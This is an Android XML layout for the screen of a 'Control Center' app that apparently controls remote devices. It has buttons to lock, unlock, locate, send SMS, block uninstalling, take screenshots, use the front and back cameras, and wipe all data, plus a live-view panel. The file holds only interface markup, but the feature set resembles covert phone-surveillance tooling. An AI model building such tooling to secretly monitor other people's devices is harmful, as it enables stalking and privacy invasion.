<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="@color/surface"
    tools:context=".controller.MainActivity">

    <!-- Header Section (Fixed Height) -->
    <LinearLayout
        android:id="@+id/header"
        android:layout_width="match_parent"
        android:layout_height="110dp"
        android:orientation="vertical"
        android:paddingHorizontal="20dp"
        android:paddingTop="12dp"
        app:layout_constraintTop_toTopOf="parent">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Control Center"
            android:textColor="@color/onSurface"
            android:textSize="20sp"
            android:fontFamily="sans-serif-medium"/>

        <com.google.android.material.card.MaterialCardView
            android:layout_width="match_parent"
            android:layout_height="44dp"
            android:layout_marginTop="8dp"
            app:cardCornerRadius="22dp"
            app:cardElevation="0dp"
            app:cardBackgroundColor="@color/surfaceVariant">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="match_parent"
                android:orientation="horizontal"
                android:gravity="center_vertical"
                android:paddingHorizontal="16dp">

                <ImageView
                    android:layout_width="18dp"
                    android:layout_height="18dp"
                    android:src="@android:drawable/ic_menu_search"
                    app:tint="@color/onSurfaceVariant"/>

                <Spinner
                    android:id="@+id/deviceSpinner"
                    android:layout_width="match_parent"
                    android:layout_height="match_parent"
                    android:background="@null"
                    android:overlapAnchor="false"
                    android:spinnerMode="dropdown"/>
            </LinearLayout>
        </com.google.android.material.card.MaterialCardView>
    </LinearLayout>

    <!-- Main Content Area (Flexible Height) -->
    <androidx.constraintlayout.widget.ConstraintLayout
        android:id="@+id/content_area"
        android:layout_width="match_parent"
        android:layout_height="0dp"
        android:paddingHorizontal="12dp"
        app:layout_constraintTop_toBottomOf="@id/header"
        app:layout_constraintBottom_toTopOf="@id/bottom_status">

        <!-- Left Panel: Controls (60% width) -->
        <LinearLayout
            android:id="@+id/left_panel"
            android:layout_width="0dp"
            android:layout_height="match_parent"
            android:orientation="vertical"
            android:padding="4dp"
            app:layout_constraintHorizontal_weight="1.2"
            app:layout_constraintStart_toStartOf="parent"
            app:layout_constraintEnd_toStartOf="@+id/right_panel">

            <com.google.android.material.tabs.TabLayout
                android:id="@+id/tabLayout"
                android:layout_width="match_parent"
                android:layout_height="36dp"
                android:background="@android:color/transparent"
                app:tabIndicatorHeight="2dp"
                app:tabIndicatorFullWidth="false"
                app:tabIndicatorColor="@color/primary"
                app:tabSelectedTextColor="@color/primary"
                app:tabTextColor="@color/onSurfaceVariant"
                app:tabMode="fixed"
                app:tabRippleColor="@android:color/transparent"
                app:tabTextAppearance="@style/CustomTabText">
                <com.google.android.material.tabs.TabItem android:text="Control"/>
                <com.google.android.material.tabs.TabItem android:text="Media"/>
                <com.google.android.material.tabs.TabItem android:text="System"/>
            </com.google.android.material.tabs.TabLayout>

            <FrameLayout
                android:layout_width="match_parent"
                android:layout_height="match_parent"
                android:layout_marginTop="4dp">

                <!-- Control Tab -->
                <GridLayout
                    android:id="@+id/tab_control"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:columnCount="2"
                    android:alignmentMode="alignMargins">

                    <com.google.android.material.button.MaterialButton
                        android:id="@+id/btnLock"
                        style="@style/Widget.Material3.Button.TonalButton"
                        android:layout_width="0dp"
                        android:layout_height="50dp"
                        android:layout_columnWeight="1"
                        android:layout_margin="3dp"
                        android:text="Lock"
                        android:textSize="12sp"
                        android:textColor="@color/onSecondaryContainer"
                        app:icon="@android:drawable/ic_lock_lock"
                        app:iconSize="16dp"
                        app:iconPadding="4dp"
                        app:iconTint="@color/onSecondaryContainer"
                        app:backgroundTint="@color/secondaryContainer"
                        app:cornerRadius="12dp"/>

                    <com.google.android.material.button.MaterialButton
                        android:id="@+id/btnUnlock"
                        style="@style/Widget.Material3.Button.TonalButton"
                        android:layout_width="0dp"
                        android:layout_height="50dp"
                        android:layout_columnWeight="1"
                        android:layout_margin="3dp"
                        android:text="Unlock"
                        android:textSize="12sp"
                        android:textColor="@color/onSecondaryContainer"
                        app:icon="@android:drawable/ic_partial_secure"
                        app:iconSize="16dp"
                        app:iconPadding="4dp"
                        app:iconTint="@color/onSecondaryContainer"
                        app:backgroundTint="@color/secondaryContainer"
                        app:cornerRadius="12dp"/>

                    <com.google.android.material.button.MaterialButton
                        android:id="@+id/btnLocation"
                        style="@style/Widget.Material3.Button.TonalButton"
                        android:layout_width="0dp"
                        android:layout_height="50dp"
                        android:layout_columnWeight="1"
                        android:layout_margin="3dp"
                        android:text="Locate"
                        android:textSize="12sp"
                        android:textColor="@color/onSecondaryContainer"
                        app:icon="@android:drawable/ic_menu_mylocation"
                        app:iconSize="16dp"
                        app:iconPadding="4dp"
                        app:iconTint="@color/onSecondaryContainer"
                        app:backgroundTint="@color/secondaryContainer"
                        app:cornerRadius="12dp"/>

                    <com.google.android.material.button.MaterialButton
                        android:id="@+id/btnSMS"
                        style="@style/Widget.Material3.Button.TonalButton"
                        android:layout_width="0dp"
                        android:layout_height="50dp"
                        android:layout_columnWeight="1"
                        android:layout_margin="3dp"
                        android:text="SMS"
                        android:textSize="12sp"
                        android:textColor="@color/onSecondaryContainer"
                        app:icon="@android:drawable/sym_action_chat"
                        app:iconSize="16dp"
                        app:iconPadding="4dp"
                        app:iconTint="@color/onSecondaryContainer"
                        app:backgroundTint="@color/secondaryContainer"
                        app:cornerRadius="12dp"/>

                    <com.google.android.material.button.MaterialButton
                        android:id="@+id/btnAntiUninstall"
                        style="@style/Widget.Material3.Button.TonalButton"
                        android:layout_width="0dp"
                        android:layout_height="50dp"
                        android:layout_columnWeight="2"
                        android:layout_columnSpan="2"
                        android:layout_margin="3dp"
                        android:text="Anti-Uninstall: OFF"
                        android:textSize="12sp"
                        android:textColor="@color/onPrimaryContainer"
                        app:backgroundTint="@color/primaryContainer"
                        app:cornerRadius="12dp"/>
                </GridLayout>

                <!-- Media Tab -->
                <GridLayout
                    android:id="@+id/tab_media"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:columnCount="2"
                    android:visibility="gone">

                    <com.google.android.material.button.MaterialButton
                        android:id="@+id/btnScreenshot"
                        style="@style/Widget.Material3.Button.TonalButton"
                        android:layout_width="0dp"
                        android:layout_height="50dp"
                        android:layout_columnWeight="1"
                        android:layout_margin="3dp"
                        android:text="Capture"
                        android:textSize="12sp"
                        android:textColor="@color/onSecondaryContainer"
                        app:icon="@android:drawable/ic_menu_camera"
                        app:iconSize="16dp"
                        app:iconPadding="4dp"
                        app:iconTint="@color/onSecondaryContainer"
                        app:backgroundTint="@color/secondaryContainer"
                        app:cornerRadius="12dp"/>

                    <com.google.android.material.button.MaterialButton
                        android:id="@+id/btnFrontCam"
                        style="@style/Widget.Material3.Button.TonalButton"
                        android:layout_width="0dp"
                        android:layout_height="50dp"
                        android:layout_columnWeight="1"
                        android:layout_margin="3dp"
                        android:text="Front"
                        android:textSize="12sp"
                        android:textColor="@color/onSecondaryContainer"
                        app:backgroundTint="@color/secondaryContainer"
                        app:cornerRadius="12dp"/>

                    <com.google.android.material.button.MaterialButton
                        android:id="@+id/btnBackCam"
                        style="@style/Widget.Material3.Button.TonalButton"
                        android:layout_width="0dp"
                        android:layout_height="50dp"
                        android:layout_columnWeight="1"
                        android:layout_margin="3dp"
                        android:text="Back"
                        android:textSize="12sp"
                        android:textColor="@color/onSecondaryContainer"
                        app:backgroundTint="@color/secondaryContainer"
                        app:cornerRadius="12dp"/>
                </GridLayout>

                <!-- System Tab -->
                <LinearLayout
                    android:id="@+id/tab_system"
                    android:layout_width="match_parent"
                    android:layout_height="match_parent"
                    android:orientation="vertical"
                    android:visibility="gone">

                    <com.google.android.material.button.MaterialButton
                        android:id="@+id/btnWipe"
                        style="@style/Widget.Material3.Button.TonalButton"
                        android:layout_width="match_parent"
                        android:layout_height="50dp"
                        android:layout_margin="3dp"
                        android:text="Wipe All Data"
                        android:textSize="12sp"
                        android:textColor="@color/onError"
                        app:icon="@android:drawable/ic_menu_delete"
                        app:iconTint="@color/onError"
                        app:backgroundTint="@color/error"
                        app:cornerRadius="12dp"/>

                    <com.google.android.material.card.MaterialCardView
                        android:layout_width="match_parent"
                        android:layout_height="0dp"
                        android:layout_weight="1"
                        android:layout_margin="3dp"
                        app:cardCornerRadius="14dp"
                        app:cardElevation="0dp"
                        app:cardBackgroundColor="@color/surfaceVariant">
                        <TextView
                            android:id="@+id/logText"
                            android:layout_width="match_parent"
                            android:layout_height="match_parent"
                            android:padding="10dp"
                            android:text="System logs..."
                            android:textSize="10sp"
                            android:fontFamily="monospace"
                            android:textColor="@color/onSurfaceVariant"/>
                    </com.google.android.material.card.MaterialCardView>
                </LinearLayout>
            </FrameLayout>
        </LinearLayout>

        <!-- Right Panel: Live Feed (Locked within Content Area) -->
        <com.google.android.material.card.MaterialCardView
            android:id="@+id/right_panel"
            android:layout_width="0dp"
            android:layout_height="match_parent"
            android:layout_margin="4dp"
            app:layout_constraintHorizontal_weight="0.8"
            app:layout_constraintStart_toEndOf="@id/left_panel"
            app:layout_constraintEnd_toEndOf="parent"
            app:cardCornerRadius="24dp"
            app:cardElevation="0dp"
            app:strokeWidth="1dp"
            app:strokeColor="@color/outline"
            app:cardBackgroundColor="@color/black">

            <RelativeLayout
                android:layout_width="match_parent"
                android:layout_height="match_parent">

                <ImageView
                    android:id="@+id/liveView"
                    android:layout_width="match_parent"
                    android:layout_height="match_parent"
                    android:layout_margin="8dp"
                    android:scaleType="fitCenter" />

                <TextView
                    android:id="@+id/placeholder"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_centerInParent="true"
                    android:text="Offline"
                    android:textColor="#4DFFFFFF"
                    android:textSize="11sp"/>

                <LinearLayout
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_alignParentBottom="true"
                    android:layout_centerHorizontal="true"
                    android:paddingBottom="12dp">

                    <com.google.android.material.floatingactionbutton.FloatingActionButton
                        android:id="@+id/btnClear"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:layout_marginEnd="6dp"
                        android:src="@android:drawable/ic_menu_close_clear_cancel"
                        app:fabSize="mini"
                        app:backgroundTint="@color/surfaceVariant"
                        app:tint="@color/onSurfaceVariant"
                        app:elevation="0dp"/>

                    <com.google.android.material.floatingactionbutton.FloatingActionButton
                        android:id="@+id/btnDownload"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:src="@android:drawable/ic_menu_save"
                        app:fabSize="mini"
                        app:backgroundTint="@color/primary"
                        app:tint="@color/onPrimary"
                        app:elevation="0dp"/>
                </LinearLayout>
            </RelativeLayout>
        </com.google.android.material.card.MaterialCardView>
    </androidx.constraintlayout.widget.ConstraintLayout>

    <!-- Bottom Status Bar (Pinned to bottom) -->
    <com.google.android.material.card.MaterialCardView
        android:id="@+id/bottom_status"
        android:layout_width="match_parent"
        android:layout_height="46dp"
        android:layout_marginHorizontal="16dp"
        android:layout_marginBottom="12dp"
        app:cardCornerRadius="23dp"
        app:cardElevation="0dp"
        app:cardBackgroundColor="@color/secondaryContainer"
        app:layout_constraintBottom_toBottomOf="parent">

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="horizontal"
            android:paddingHorizontal="18dp"
            android:gravity="center_vertical">

            <View
                android:id="@+id/statusIndicator"
                android:layout_width="8dp"
                android:layout_height="8dp"
                android:background="@drawable/status_dot"/>

            <TextView
                android:id="@+id/statusText"
                android:layout_width="0dp"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:layout_marginStart="10dp"
                android:text="Device: None"
                android:textColor="@color/onSecondaryContainer"
                android:textSize="13sp"
                android:fontFamily="sans-serif-medium"/>

            <TextView
                android:id="@+id/lastSeenText"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="N/A"
                android:textColor="@color/onSecondaryContainer"
                android:textSize="11sp"
                android:alpha="0.7"/>
        </LinearLayout>
    </com.google.android.material.card.MaterialCardView>

</androidx.constraintlayout.widget.ConstraintLayout>